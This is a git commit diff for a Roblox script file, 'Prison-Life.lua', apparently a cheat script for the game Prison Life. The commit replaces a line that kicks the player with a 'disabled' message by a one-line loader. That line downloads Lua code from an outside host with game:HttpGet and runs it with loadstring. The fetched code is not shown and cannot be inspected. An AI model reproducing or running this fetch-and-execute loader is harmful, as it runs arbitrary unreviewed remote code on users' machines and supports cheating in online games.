cfa5440680a1d49c3286a9805e58d41ca7475e33
x.nep <57833538+zenss555a@users.noreply.github.com>
2026-01-25 09:16:38 +0700

    Update Prison-Life.lua

--- Prison-Life.lua
+++ Prison-Life.lua
@@ -1,1 +1,1 @@
-game.Players.LocalPlayer:Kick("Disable the script for the upcoming update ;)")
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/2508395c90052ffd288fa02381df3d685b3ef520411ea31d1266c92f3c52e605/download"))()
